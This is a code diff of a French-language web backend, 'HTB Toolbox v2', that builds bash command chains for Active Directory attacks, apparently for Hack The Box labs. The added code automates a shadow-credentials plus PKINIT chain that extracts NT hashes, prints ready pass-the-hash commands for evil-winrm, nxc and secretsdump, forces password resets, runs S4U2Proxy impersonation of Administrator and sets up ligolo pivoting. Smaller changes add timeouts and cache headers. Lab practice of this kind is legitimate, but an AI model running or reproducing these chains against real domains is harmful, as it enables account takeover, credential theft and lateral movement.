+            f"if [ ! -s \"$KRB_FILE\" ] || ! grep -q default_realm \"$KRB_FILE\"; then "
+            f"  echo '[~] nxc --generate-krb5-file indisponible, utilise le template minimal…'; "
+            f"  cat > \"$KRB_FILE\" <<EOF\n"
+            f"[libdefaults]\n"
+            f"    default_realm = {d.upper()}\n"
+            f"    dns_lookup_realm = false\n"
+            f"    dns_lookup_kdc = false\n"
+            f"    ticket_lifetime = 24h\n"
+            f"    forwardable = yes\n"
+            f"    rdns = false\n"
+            f"\n"
+            f"[realms]\n"
+            f"    {d.upper()} = {{\n"
+            f"        kdc = {dc or f'DC01.{d}'}\n"
+            f"        admin_server = {dc or f'DC01.{d}'}\n"
+            f"    }}\n"
+            f"\n"
+            f"[domain_realm]\n"
+            f"    .{d} = {d.upper()}\n"
+            f"    {d} = {d.upper()}\n"
+            f"EOF\n"
+            f"fi; "
+            f"echo \"[+] krb5.conf généré : $KRB_FILE\"; "
+            f"echo ''; echo '=== 2/4 Installation dans /etc/krb5.conf ==='; "
+            f"if [ -f /etc/krb5.conf ] && ! diff -q \"$KRB_FILE\" /etc/krb5.conf >/dev/null 2>&1; then "
+            f"  BACKUP=/etc/krb5.conf.htbtoolbox.$(date +%s).bak; "
+            f"  echo \"[*] Backup /etc/krb5.conf → $BACKUP\"; "
+            f"  SUDO_RUN cp /etc/krb5.conf \"$BACKUP\" 2>&1 || echo '[!] Backup échoué (sudo refusé ?)'; "
+            f"fi; "
+            f"SUDO_RUN cp \"$KRB_FILE\" /etc/krb5.conf 2>&1 && echo '[+] /etc/krb5.conf installé' || "
+            f"{{ echo '[!] Impossible d écrire /etc/krb5.conf — export KRB5_CONFIG sera utilisé à la place.'; }}; "
+            f"echo ''; echo '=== 3/4 /etc/hosts (entrée {t} ↔ {dc or f'DC01.{d}'}) ==='; "
+            f"HOSTLINE={shell_quote(f'{t} {dc or f'DC01.{d}'} {d}')}; "
+            f"if grep -qE \"^{t}[[:space:]]\" /etc/hosts; then "
+            f"  CUR=$(grep -E \"^{t}[[:space:]]\" /etc/hosts | head -1); "
+            f"  if [ \"$CUR\" = \"$HOSTLINE\" ]; then echo '[=] Entrée déjà à jour'; "
+            f"  else "
+            f"    echo \"[*] Remplacement : $CUR → $HOSTLINE\"; "
+            f"    SUDO_SH \"sed -i '/^{t}[[:space:]]/d' /etc/hosts && printf '%s\\n' '$HOSTLINE' >> /etc/hosts\" && echo '[+] /etc/hosts mis à jour' || echo '[!] Maj /etc/hosts échouée'; "
+            f"  fi; "
+            f"else "
+            f"  SUDO_SH \"printf '%s\\n' '$HOSTLINE' >> /etc/hosts\" && echo '[+] Entrée ajoutée à /etc/hosts' || echo '[!] Ajout /etc/hosts échoué'; "
+            f"fi; "
+            f"echo ''; echo '=== 4/4 Sync horloge sur DC ==='; "
+            f"echo '[*] Désactivation NTP auto (timedatectl set-ntp false)'; "
+            f"SUDO_RUN timedatectl set-ntp false 2>/dev/null || echo '[~] timedatectl indisponible ou refusé — on continue'; "
+            # On capture la sortie et on décide OK/KO en fonction du texte, pas du code retour
+            # (ntpdate sur Kali = wrapper sntp/ntpdig qui retourne 0 même en échec).
+            f"NTP_OK=0; NTP_OUT=''; "
+            f"if command -v ntpdate >/dev/null 2>&1; then "
+            f"  NTP_OUT=$(SUDO_RUN ntpdate -u {qdc} 2>&1); "
+            f"  echo \"$NTP_OUT\" | tail -3; "
+            f"  echo \"$NTP_OUT\" | grep -qiE '(adjust|step|offset|stratum|server.*refid)' && NTP_OK=1; "
+            f"elif command -v rdate >/dev/null 2>&1; then "
+            f"  NTP_OUT=$(SUDO_RUN rdate -n {qdc} 2>&1); "
+            f"  echo \"$NTP_OUT\" | tail -3; "
+            f"  echo \"$NTP_OUT\" | grep -qiE '(adjust|step|set)' && NTP_OK=1; "
+            f"elif command -v chronyc >/dev/null 2>&1; then "
+            f"  NTP_OUT=$(SUDO_RUN chronyc -a 'burst 4/4' 2>&1); "
+            f"  echo \"$NTP_OUT\" | tail -3; "
+            f"  echo \"$NTP_OUT\" | grep -qiE '200 OK' && NTP_OK=1; "
+            f"else "
+            f"  echo '[!] Aucun client NTP (ntpdate/rdate/chronyc). Installer : sudo apt install ntpdate'; "
+            f"fi; "
+            f"if [ \"$NTP_OK\" = \"1\" ]; then echo '[+] Horloge synchronisée avec le DC'; "
+            f"else echo '[~] Sync NTP échoué — le getTGT peut renvoyer KRB_AP_ERR_SKEW si le décalage > 5min.'; "
+            f"  echo '    Fallback manuel : sudo timedatectl set-time \"$(rdate -p {qdc} 2>/dev/null | head -1)\" ou régler l horloge via le DC.'; "
+            f"fi; "
+            f"echo ''; echo '=== Résumé ==='; "
+            f"echo \"  krb5.conf  : $KRB_FILE\"; "
+            f"HOST_LINE_NOW=$(grep -E \"^{t}[[:space:]]\" /etc/hosts 2>/dev/null | head -1); "
+            f"echo \"  /etc/hosts : ${{HOST_LINE_NOW:-non configuré}}\"; "
+            f"echo \"  horloge    : $(date)\"; "
+            f"echo \"  NTP status : $([ \"$NTP_OK\" = \"1\" ] && echo OK || echo KO)\"; "
+            f"echo ''; echo '=== Prochaines étapes ==='; "
+            f"echo \"  1. Vérifier klist : klist\"; "
+            f"echo \"  2. Obtenir un TGT : lance l outil 'getTGT' dans l UI\"; "
+            f"echo \"  3. KRB5_CONFIG sera auto-injecté dans tous les outils tant que $KRB_FILE existe.\""
         ] if t and d else None,
+
+        "bloodyad_shadow_add": ["bash","-c",
+            f"TOOL={shell_quote(get_bloodyad())}; "
+            f"command -v $TOOL >/dev/null || {{ echo '[!] bloodyAD introuvable'; exit 1; }}; "
+            f"mkdir -p {qout}/attack_checks {qout}/bloodyad; "
+            + (f"TARGET_ACCOUNT={qta}; "
+               if ta else
+               "TARGET_ACCOUNT='MSA_HEALTH$'; "
+               "echo '[!] Aucun target_account défini — utilise le placeholder MSA_HEALTH$'; "
+               "echo '[!] Remplis le champ target_account dans l UI (ex: MSA_HEALTH$, SQLSVC$, etc.)'; ")
+            + f"OUTFILE={qout}/attack_checks/shadow_add.txt; "
+            f"echo \"=== bloodyAD add shadowCredentials → $TARGET_ACCOUNT ===\" | tee \"$OUTFILE\"; "
+            + (f"KRB5CCNAME={qcc} $TOOL -k --host {qdc} -d {qd} -u {qu} "
+               f"add shadowCredentials \"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUTFILE\""
+               if cc else
+               f"$TOOL --host {qdc} --dc-ip {qt} -d {qd} -u {qu} "
+               + (f"--hash {qnt}" if nt else f"-p {qp}")
+               + f" add shadowCredentials \"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUTFILE\""
+               if u else "echo 'Credentials requis'")
+            + f"; echo ''; echo '=== Hash NTLM extrait (si trouvé) ==='; "
+            f"NT_OUT=$(grep -oE 'NT[[:space:]]*[:=][[:space:]]*[a-f0-9]{{32}}' \"$OUTFILE\" | head -1 | grep -oE '[a-f0-9]{{32}}'); "
+            f"if [ -n \"$NT_OUT\" ]; then "
+            f"  echo \"[+] Hash NTLM de $TARGET_ACCOUNT : $NT_OUT\"; "
+            f"  echo ''; echo '=== Prochaines étapes ==='; "
+            f"  echo \"evil-winrm -i {dc or t} -u '$TARGET_ACCOUNT' -H '$NT_OUT'\"; "
+            f"  echo \"nxc winrm {t} -u '$TARGET_ACCOUNT' -H '$NT_OUT' -d {d}\"; "
+            f"  echo \"impacket-secretsdump -hashes :$NT_OUT {d}/$TARGET_ACCOUNT@{t}\"; "
+            f"else "
+            f"  echo '[~] Aucun hash NTLM trouvé dans la sortie — vérifie l auth Kerberos (klist) et les droits GenericWrite sur la cible.'; "
+            f"fi"
+        ] if t and d and u else None,
+
+        "shadowcred_pkinit_chain": ["bash","-c",
+            f"set -o pipefail; "
+            f"BLOODY={shell_quote(get_bloodyad())}; "
+            f"PKDIR={qpkdir}; "
+            f"GETTGT_PKI=\"$PKDIR/gettgtpkinit.py\"; "
+            f"GETNTHASH_PKI=\"$PKDIR/getnthash.py\"; "
+            f"mkdir -p {qout}/attack_checks {qout}/bloodyad {qout}/kerberos; "
+            f"OUTFILE={qout}/attack_checks/shadowcred_pkinit_chain.txt; "
+            f"GETTGT_OUT={qout}/attack_checks/gettgtpkinit.txt; "
+            f"GETNTHASH_OUT={qout}/attack_checks/getnthash_pkinit.txt; "
+            f"SUDO={shell_quote(sp)}; "
+            f"SUDO_RUN() {{ if [ -n \"$SUDO\" ]; then printf '%s\\n' \"$SUDO\" | sudo -S -p '' \"$@\"; else sudo -n \"$@\" 2>/dev/null || {{ echo '[~] sudo non disponible sans mot de passe — étape ignorée'; return 1; }}; fi; }}; "
+            + (f"TARGET_ACCOUNT={qta}; " if ta else
+               "TARGET_ACCOUNT='MSA_HEALTH$'; "
+               "echo '[!] Aucun target_account défini — utilisation du placeholder MSA_HEALTH$'; ")
+            + f"TA_HOST=$(printf '%s' \"$TARGET_ACCOUNT\" | tr '[:upper:]' '[:lower:]' | sed 's/\\$$//'); "
+            f"EXPECTED_HOSTS='{t} {d} {dc} '$TA_HOST'.{d}'; "
+            f"echo \"=== shadowcred auto chain → $TARGET_ACCOUNT ===\" | tee \"$OUTFILE\"; "
+            f"echo '[*] Précheck Kerberos / hosts' | tee -a \"$OUTFILE\"; "
+            + (f"echo \"[*] KRB5CCNAME initial : {cc}\" | tee -a \"$OUTFILE\"; "
+               f"KRB5CCNAME={qcc} klist 2>&1 | tee -a \"$OUTFILE\"; "
+               if cc else
+               "echo '[~] Aucun ccache fourni dans l UI — bloodyAD tentera -k avec le cache courant ou retentera avec -p si disponible.' | tee -a \"$OUTFILE\"; ")
+            + f"echo \"[*] /etc/hosts attendu : $EXPECTED_HOSTS\" | tee -a \"$OUTFILE\"; "
+            f"grep -E '^{t}[[:space:]]' /etc/hosts 2>/dev/null | tee -a \"$OUTFILE\" || echo '[~] Aucune entrée /etc/hosts pour cette cible.' | tee -a \"$OUTFILE\"; "
+            f"echo '[*] timedatectl set-ntp false' | tee -a \"$OUTFILE\"; "
+            f"SUDO_RUN timedatectl set-ntp false 2>&1 | tee -a \"$OUTFILE\" || true; "
+            f"if command -v ntpdate >/dev/null 2>&1; then echo '[*] ntpdate -u {dc if dc else t}' | tee -a \"$OUTFILE\"; SUDO_RUN ntpdate -u {qdc} 2>&1 | tee -a \"$OUTFILE\" || true; fi; "
+            f"if [ ! -f \"$GETTGT_PKI\" ] || [ ! -f \"$GETNTHASH_PKI\" ]; then "
+            f"  echo '[*] PKINITtools absent — tentative d installation locale…' | tee -a \"$OUTFILE\"; "
+            f"  if command -v git >/dev/null 2>&1; then "
+            f"    if [ -d \"$PKDIR/.git\" ]; then git -C \"$PKDIR\" pull --ff-only 2>&1 | tee -a \"$OUTFILE\" || true; "
+            f"    else git clone https://github.com/dirkjanm/PKINITtools.git \"$PKDIR\" 2>&1 | tee -a \"$OUTFILE\" || true; fi; "
+            f"    if [ -f \"$PKDIR/requirements.txt\" ]; then python3 -m pip install -r \"$PKDIR/requirements.txt\" 2>&1 | tee -a \"$OUTFILE\" || true; fi; "
+            f"  else echo '[~] git introuvable — installation auto PKINITtools impossible.' | tee -a \"$OUTFILE\"; fi; "
+            f"fi; "
+            f"command -v $BLOODY >/dev/null || {{ echo '[!] bloodyAD introuvable' | tee -a \"$OUTFILE\"; exit 1; }}; "
+            f"echo ''; echo '=== bloodyAD add shadowCredentials ===' | tee -a \"$OUTFILE\"; "
+            + (f"if [ -n {qcc} ]; then export KRB5CCNAME={qcc}; fi; " if cc else "")
+            + f"$BLOODY --host {qdc} --dc-ip {qt} -d {qd} -u {qu} -k add shadowCredentials \"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUTFILE\"; "
+            f"if ! grep -qiE 'Saved PEM certificate|KeyCredential generated|A TGT can now be obtained' \"$OUTFILE\"; then "
+            + (f"  echo ''; echo '[~] Tentative fallback avec -p malgré -k' | tee -a \"$OUTFILE\"; "
+               f"  $BLOODY --host {qdc} --dc-ip {qt} -d {qd} -u {qu} -p {qp} -k add shadowCredentials \"$TARGET_ACCOUNT\" 2>&1 | tee -a \"$OUTFILE\"; "
+               if p else
+               "  echo '[!] Pas de mot de passe disponible pour le fallback -p.' | tee -a \"$OUTFILE\"; ")
+            + f"fi; "
+            f"CERT_FILE=$(grep -oE 'Saved PEM certificate at path: .*' \"$OUTFILE\" | tail -1 | sed 's/.*path: //'); "
+            f"KEY_FILE=$(grep -oE 'Saved PEM private key at path: .*' \"$OUTFILE\" | tail -1 | sed 's/.*path: //'); "
+            f"BASE_NAME=$(grep -oE 'filename: [A-Za-z0-9._-]+' \"$OUTFILE\" | tail -1 | awk '{{print $2}}'); "
+            f"if [ -z \"$CERT_FILE\" ] && [ -n \"$BASE_NAME\" ]; then CERT_FILE=\"${{BASE_NAME}}_cert.pem\"; fi; "
+            f"if [ -z \"$KEY_FILE\" ] && [ -n \"$BASE_NAME\" ]; then KEY_FILE=\"${{BASE_NAME}}_priv.pem\"; fi; "
+            f"if [ -n \"$CERT_FILE\" ] && [ ! -f \"$CERT_FILE\" ] && [ -f \"$PWD/$CERT_FILE\" ]; then CERT_FILE=\"$PWD/$CERT_FILE\"; fi; "
+            f"if [ -n \"$KEY_FILE\" ] && [ ! -f \"$KEY_FILE\" ] && [ -f \"$PWD/$KEY_FILE\" ]; then KEY_FILE=\"$PWD/$KEY_FILE\"; fi; "
+            f"PKI_CCACHE={qout}/attack_checks/${{BASE_NAME:-shadowcred}}.ccache; "
+            f"echo ''; echo '=== Artefacts shadowCredentials ===' | tee -a \"$OUTFILE\"; "
+            f"echo \"CERT_FILE=${{CERT_FILE:-absent}}\" | tee -a \"$OUTFILE\"; "
+            f"echo \"KEY_FILE=${{KEY_FILE:-absent}}\" | tee -a \"$OUTFILE\"; "
+            f"if [ -f \"$GETTGT_PKI\" ] && [ -n \"$CERT_FILE\" ] && [ -n \"$KEY_FILE\" ] && [ -f \"$CERT_FILE\" ] && [ -f \"$KEY_FILE\" ]; then "
+            f"  echo ''; echo '=== PKINIT gettgtpkinit.py ===' | tee -a \"$OUTFILE\"; "
+            f"  python3 \"$GETTGT_PKI\" -cert-pem \"$CERT_FILE\" -key-pem \"$KEY_FILE\" {shell_quote(f'{d}/')}\"$TARGET_ACCOUNT\" \"$PKI_CCACHE\" 2>&1 | tee \"$GETTGT_OUT\"; "
+            f"  cat \"$GETTGT_OUT\" >> \"$OUTFILE\"; "
+            f"  if [ -f \"$PKI_CCACHE\" ]; then "
+            f"    echo ''; echo '=== klist PKINIT ===' | tee -a \"$OUTFILE\"; "
+            f"    KRB5CCNAME=\"$PKI_CCACHE\" klist 2>&1 | tee -a \"$OUTFILE\"; "
+            f"  fi; "
+            f"  ASREP_KEY=$(grep -i 'AS-REP encryption key' \"$GETTGT_OUT\" | tail -1 | sed 's/.*: *//'); "
+            f"  if [ -f \"$GETNTHASH_PKI\" ] && [ -n \"$ASREP_KEY\" ] && [ -f \"$PKI_CCACHE\" ]; then "
+            f"    echo ''; echo '=== PKINIT getnthash.py ===' | tee -a \"$OUTFILE\"; "
+            f"    KRB5CCNAME=\"$PKI_CCACHE\" python3 \"$GETNTHASH_PKI\" -key \"$ASREP_KEY\" {shell_quote(f'{d}/')}\"$TARGET_ACCOUNT\" 2>&1 | tee \"$GETNTHASH_OUT\"; "
+            f"    cat \"$GETNTHASH_OUT\" >> \"$OUTFILE\"; "
+            f"    NTHASH=$(grep -oE '[A-Fa-f0-9]{{32}}' \"$GETNTHASH_OUT\" | tail -1); "
+            f"    if [ -n \"$NTHASH\" ]; then "
+            f"      echo ''; echo '=== WinRM / nxc prêts ===' | tee -a \"$OUTFILE\"; "
+            f"      echo \"evil-winrm -i {dc if dc else t} -u '$TA_HOST$' -H '$NTHASH'\" | tee -a \"$OUTFILE\"; "
+            f"      echo \"evil-winrm -i {t} -u '$TA_HOST$' -H '$NTHASH'\" | tee -a \"$OUTFILE\"; "
+            f"      echo \"{get_nxc()} winrm {t} -u '$TA_HOST$' -H '$NTHASH' -d {d}\" | tee -a \"$OUTFILE\"; "
+            f"    else "
+            f"      echo '[~] Aucun NT hash extrait automatiquement depuis getnthash.py.' | tee -a \"$OUTFILE\"; "
+            f"    fi; "
+            f"  else "
+            f"    echo '[~] getnthash.py indisponible, clé AS-REP absente, ou ccache PKINIT manquant.' | tee -a \"$OUTFILE\"; "
+            f"  fi; "
+            f"else "
+            f"  echo '[~] PKINITtools/gettgtpkinit.py absent ou cert/key non trouvés — enchaînement auto PKINIT ignoré.' | tee -a \"$OUTFILE\"; "
+            f"fi; "
+            f"echo ''; echo '=== Commandes de secours ===' | tee -a \"$OUTFILE\"; "
+            f"if [ -n \"$CERT_FILE\" ] && [ -n \"$KEY_FILE\" ]; then "
+            f"  echo \"python3 $PKDIR/gettgtpkinit.py -cert-pem $CERT_FILE -key-pem $KEY_FILE '{d}/$TARGET_ACCOUNT' $PKI_CCACHE\" | tee -a \"$OUTFILE\"; "
+            f"fi; "
+            f"echo '[+] Chaîne shadowcred terminée. Consulte shadowcred_pkinit_chain.txt pour le détail.' | tee -a \"$OUTFILE\""
+        ] if t and d and u else None,
+
+        "nxc_smb_auth_test": ["bash","-c",
+            f"mkdir -p {qout}/attack_checks; "
+            f"OUT={qout}/attack_checks/smb_auth_test.txt; "
+            f"TIMEOUT_BIN=$(command -v timeout || true); "
+            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 90s }}; "
+            f"echo \"=== nxc smb auth test ({u}) ===\" | tee \"$OUT\"; "
+            + (f"${{RUNNER}}{shell_quote(nxc)} smb {qt} -u {qu} -H {qnt} -d {qd} 2>&1 | tee -a \"$OUT\""
+               if nt else
+               f"${{RUNNER}}{shell_quote(nxc)} smb {qt} -u {qu} -p {qp} -d {qd} 2>&1 | tee -a \"$OUT\""
+               if u else "echo '[!] Credentials requis'; exit 1")
+            + f"; echo ''; "
+            f"if grep -qiE 'STATUS_ACCOUNT_RESTRICTION|STATUS_LOGON_TYPE_NOT_GRANTED' \"$OUT\"; then "
+            f"  echo '[~] Compte valide mais restriction SMB détectée (STATUS_ACCOUNT_RESTRICTION).'; "
+            f"  echo '    → Mot de passe correct, mais SMB bloqué. Passe en Kerberos :'; "
+            f"  echo '      1. krb5_setup  (génère krb5.conf + sync NTP)'; "
+            f"  echo '      2. gettgt      (récupère un TGT)'; "
+            f"  echo '      3. colle le ccache dans le champ UI, puis relance tes outils avec -k'; "
+            f"elif grep -qiE 'STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|STATUS_WRONG_PASSWORD' \"$OUT\"; then "
+            f"  echo '[!] Credentials invalides — mauvais mot de passe/hash.'; "
+            f"elif grep -qiE '\\[\\+\\].*(Pwn3d|\\(admin\\))' \"$OUT\"; then "
+            f"  echo '[+] Admin SMB ! Enchaîne : secretsdump, smb_loot, postauth_hints.'; "
+            f"elif grep -qE '\\[\\+\\]' \"$OUT\"; then "
+            f"  echo '[+] Auth SMB OK (user standard). Enchaîne : smb_loot, ldap_users_auth, bloodhound.'; "
+            f"else "
+            f"  echo '[~] Résultat ambigu — vérifie /etc/hosts, nom de domaine, et logs ci-dessus.'; "
+            f"fi"
+        ] if t and u else None,
 
         "certipy_find": ["bash","-c",
             f"TOOL={shell_quote(get_certipy())}; command -v $TOOL >/dev/null || {{ echo 'certipy introuvable'; exit 1; }}; "
@@ -5257,32 +5685,37 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             + f"; echo ''; echo '--- Le NTLM hash extrait peut être utilisé avec -H pour nxc/evil-winrm ---'"
         ] if t else None,
 
-        "forcechangepwd": (lambda _rpc_hint=shell_quote(
-                f"rpcclient -U '{d}\\\\{u}%{p or 'PASS'}' {t} -c 'setuserinfo2 TARGET_ACCOUNT 23 HTBpwned2025!'"
-            ): ["bash","-c",
+        "forcechangepwd": ["bash","-c",
             f"BLOODY={shell_quote(get_bloodyad())}; "
             f"mkdir -p {qout}/attack_checks; "
-            + (f"echo '=== ForceChangePassword via bloodyAD ==='; "
-               f"echo '[!] Remplace TARGET_ACCOUNT par le compte cible (ex: a.white_adm)'; "
+            + (f"TARGET_ACCOUNT={qta}; " if ta else
                f"TARGET_ACCOUNT='TARGET_ACCOUNT'; "
-               f"NEW_PASS='HTBpwned2025!'; "
-               f"$BLOODY -d {qd} -u {qu} "
-               + (f"--hash {qnt}" if nt else f"-p {qp}")
-               + f" --host {qdc if dc else qt} --dc-ip {qt} "
-               f"set password $TARGET_ACCOUNT $NEW_PASS 2>&1 | tee {qout}/attack_checks/forcechangepwd.txt; "
+               f"echo '[!] Remplis le champ target_account dans l UI (ex: a.white_adm) puis relance.'; ")
+            + (f"NEW_PASS='HTBpwned2025!'; "
+               f"echo \"=== ForceChangePassword via bloodyAD → $TARGET_ACCOUNT ===\"; "
+               + (f"KRB5CCNAME={qcc} $BLOODY -k -d {qd} -u {qu} --host {qdc} "
+                  f"set password \"$TARGET_ACCOUNT\" \"$NEW_PASS\""
+                  if cc else
+                  f"$BLOODY -d {qd} -u {qu} "
+                  + (f"--hash {qnt}" if nt else f"-p {qp}")
+                  + f" --host {qdc if dc else qt} --dc-ip {qt} "
+                  f"set password \"$TARGET_ACCOUNT\" \"$NEW_PASS\"")
+               + f" 2>&1 | tee {qout}/attack_checks/forcechangepwd.txt; "
                f"echo ''; echo '=== Alternative rpcclient ==='; "
-               f"echo {_rpc_hint}"
+               f"echo \"rpcclient -U '{d}\\\\{u}%{p or 'PASS'}' {t} -c \\\"setuserinfo2 $TARGET_ACCOUNT 23 $NEW_PASS\\\"\""
                if u else "echo 'Credentials requis pour ForceChangePassword'")
-        ])() if t and d else None,
+        ] if t and d else None,
 
         "getST_constrained": (lambda _dom=d or "domain": ["bash","-c",
             f"TOOL={shell_quote(get_impacket('getST'))}; "
             f"command -v $TOOL >/dev/null || {{ echo 'getST introuvable — vérifiez impacket'; exit 1; }}; "
             f"mkdir -p {qout}/attack_checks; "
             + (f"echo '=== S4U2Proxy Constrained Delegation ==='; "
-               f"echo '[!] Remplace SPN_TARGET par le SPN cible (ex: http/WEB01.{_dom}) et IMPERSONATE par le compte a usurper'; "
-               f"SPN_TARGET='http/TARGET.{_dom}'; "
-               f"IMPERSONATE='Administrator'; "
+               + (f"IMPERSONATE={qta}; " if ta else
+                  "IMPERSONATE='Administrator'; "
+                  "echo '[!] Aucun target_account défini — utilise Administrator (renseigne le champ target_account pour personnaliser)'; ")
+               + f"SPN_TARGET='http/TARGET.{_dom}'; "
+               f"echo '[!] Remplace SPN_TARGET par le SPN cible (ex: http/WEB01.{_dom})'; "
                + (f"KRB5CCNAME={qcc} $TOOL -spn \"$SPN_TARGET\" -impersonate \"$IMPERSONATE\" "
                   f"-k -no-pass -dc-ip {qt} {shell_quote(f'{d}/{u}')} 2>&1"
                   if cc else
@@ -5291,7 +5724,7 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
                      f"{shell_quote(f'{d}/{u}:{p}')}")
                   + f" 2>&1")
                + f" | tee {qout}/attack_checks/getST.txt; "
-               f"echo ''; echo '--- Utilise le ccache genere : export KRB5CCNAME=Administrator@http_...ccache ---'"
+               f"echo ''; echo '--- Utilise le ccache genere : export KRB5CCNAME=$IMPERSONATE@http_...ccache ---'"
                if u else "echo 'Credentials requis pour getST'")
         ])() if t and d else None,
 
@@ -5367,6 +5800,7 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
 
         # ── Tunneling / Pivot ────────────────────────────────────────────
         "ligolo_server": ["bash","-c",
+            f"SUDO_PASS={shell_quote(sp)}; "
             f"command -v ligolo-proxy >/dev/null || {{ "
             f"echo '[!] ligolo-proxy introuvable'; "
             f"echo 'Install : wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz -O /tmp/ligolo.tar.gz'; "
@@ -5381,7 +5815,7 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"  elif [ -n \"${{SUDO_PASS:-}}\" ]; then "
             f"    printf '%s\\n' \"$SUDO_PASS\" | sudo -S -p '' ip link set ligolo up 2>/dev/null || true; "
             f"  else "
-            f"    sudo ip link set ligolo up 2>/dev/null || true; "
+            f"    sudo -n ip link set ligolo up 2>/dev/null || echo '[~] sudo requis pour activer l interface ligolo'; "
             f"  fi; "
             f"else "
             f"  if [ \"$(id -u)\" -eq 0 ]; then "
@@ -5392,8 +5826,8 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"    echo '[+] Interface TUN ligolo créée' || "
             f"    echo '[!] échec de création de l''interface ligolo malgré sudo'; "
             f"  else "
-            f"    sudo ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null && "
-            f"    sudo ip link set ligolo up 2>/dev/null && "
+            f"    sudo -n ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null && "
+            f"    sudo -n ip link set ligolo up 2>/dev/null && "
             f"    echo '[+] Interface TUN ligolo créée' || "
             f"    echo '[!] sudo requis pour créer ligolo TUN : sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up'; "
             f"  fi; "
@@ -5616,6 +6050,11 @@ async def ws_endpoint(ws: WebSocket):
         await send("tool_output", {"tool_id": tool_id,
             "line": f"[CMD] {cmd_disp}",
             "done": False, "rc": None})
+        run_cmd_base, timeout_budget = apply_timeout_budget(tool_id, cmd)
+        if timeout_budget:
+            await send("tool_output", {"tool_id": tool_id,
+                "line": f"[*] Timeout de securite applique: {timeout_budget}s",
+                "done": False, "rc": None})
 
         entry = {"tool_id": tool_id, "start": time.time(), "rc": None, "duration": 0}
         timeline.append(entry)
@@ -5625,7 +6064,7 @@ async def ws_endpoint(ws: WebSocket):
         try:
             sub_env = build_shell_env(cfg)
             sub_env["PYTHONUNBUFFERED"] = "1"
-            run_cmd = (["stdbuf", "-oL", "-eL"] + cmd) if shutil.which("stdbuf") else cmd
+            run_cmd = (["stdbuf", "-oL", "-eL"] + run_cmd_base) if shutil.which("stdbuf") else run_cmd_base
             proc = await asyncio.create_subprocess_exec(
                 *run_cmd,
                 stdout=asyncio.subprocess.PIPE,
@@ -5648,6 +6087,15 @@ async def ws_endpoint(ws: WebSocket):
             dur = round(time.monotonic()-t0, 2)
             entry["rc"] = proc.returncode
             entry["duration"] = dur
+            if proc.returncode == 124:
+                timeout_msg = "[!] Timeout atteint — outil arrêté par la borne de temps de sécurité."
+                if output_len < MAX_CAPTURE_CHARS:
+                    remaining = MAX_CAPTURE_CHARS - output_len
+                    clipped = timeout_msg[:remaining]
+                    output_chunks.append(clipped)
+                    output_len += len(clipped) + 1
+                await send("tool_output", {"tool_id": tool_id,
+                    "line": timeout_msg, "done": False, "rc": None})
             _persist_timeline()
             result_path = persist_module_result(tool_id, cfg, entry, "\n".join(output_chunks), out_dir)
             await send("tool_output", {"tool_id": tool_id,
@@ -6161,6 +6609,26 @@ async def ws_endpoint(ws: WebSocket):
                     await send("ntp_sync_result", {"ok": False, "error": "ntpdate introuvable"})
                     continue
                 try:
+                    timedatectl_out = ""
+                    td_cmd = ["sudo"]
+                    td_stdin = None
+                    td_input = None
+                    if sudo_password:
+                        td_cmd += ["-S", "-p", ""]
+                        td_stdin = asyncio.subprocess.PIPE
+                        td_input = f"{sudo_password}\n".encode()
+                    td_cmd += ["timedatectl", "set-ntp", "false"]
+                    try:
+                        td_proc = await asyncio.create_subprocess_exec(
+                            *td_cmd,
+                            stdin=td_stdin,
+                            stdout=asyncio.subprocess.PIPE,
+                            stderr=asyncio.subprocess.STDOUT)
+                        td_out, _ = await asyncio.wait_for(td_proc.communicate(input=td_input), timeout=10)
+                        timedatectl_out = td_out.decode("utf-8", errors="replace")
+                    except Exception:
+                        timedatectl_out = ""
+
                     cmd = ["sudo"]
                     stdin_pipe = None
                     input_data = None
@@ -6176,6 +6644,8 @@ async def ws_endpoint(ws: WebSocket):
                         stderr=asyncio.subprocess.STDOUT)
                     out, _ = await asyncio.wait_for(proc.communicate(input=input_data), timeout=15)
                     txt = out.decode("utf-8", errors="replace")
+                    if timedatectl_out.strip():
+                        txt = "[timedatectl set-ntp false]\n" + timedatectl_out[:200] + "\n" + txt
                     ok = proc.returncode == 0 or _parse_ntp_offset(txt) is not None
                     if ok and domain:
                         out_dir = get_output_dir(domain)
@@ -6250,7 +6720,13 @@ async def ws_endpoint(ws: WebSocket):
 @app.get("/")
 async def root():
     p = BASE_DIR / "index.html"
-    return FileResponse(str(p)) if p.exists() else HTMLResponse("<h1>index.html manquant</h1>")
+    if not p.exists():
+        return HTMLResponse("<h1>index.html manquant</h1>")
+    return FileResponse(str(p), headers={
+        "Cache-Control": "no-cache, no-store, must-revalidate",
+        "Pragma": "no-cache",
+        "Expires": "0",
+    })
 
 
 @app.get("/loot_file")
@@ -6277,7 +6753,7 @@ async def health():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8765))
     host = os.environ.get("HOST", "127.0.0.1")
-    sc   = "✓ présent" if script_available() else "✗ absent (mode direct de repli)"
+    sc   = "✓ présent (utilitaires)" if script_available() else "✗ absent (/etc/hosts manuel)"
     print(f"""
 ╔══════════════════════════════════════════════════╗
 ║        HTB Toolbox v2 — Backend local            ║
